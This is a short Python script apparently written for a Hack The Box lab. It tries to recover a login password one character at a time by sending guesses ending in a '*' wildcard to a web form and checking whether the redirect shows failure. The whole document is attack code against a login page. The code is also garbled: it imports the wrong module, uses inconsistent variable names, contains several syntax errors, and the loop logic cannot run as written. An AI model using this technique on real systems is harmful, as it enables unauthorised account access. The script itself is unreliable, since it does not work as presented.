# web bruteforce script made for HTB

import request
import string

url = "http://your_url_here" # target URL

password = ""
chars = string.ascii_letters # adds ASCII letters
chars += ''.join(['1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '@', '#', '$', '%',' '^', '&', '*', '{', '}', '-', '_', '~', '`', '/', '?', '.']) # adds spec chars
count = 0
                  
print("Trying to bruteforce password..."\n)
                  
while True:
  if counter == len(chars):
    print(password)
    break
        
    test_pass = password + chars[count] + "*"
    print("Trying: " + test_pass
    
    data = {"username":"insertusernamehere", "password":test_pass} # prepares to send attempted password with username
    r = requests.post(url, data=data) # sends info above to webpage
         
    if (r.url != url + "?message=Authentication%20failed"):
          password += chars[count]
          count = 0
    else:
          counter += 1
          
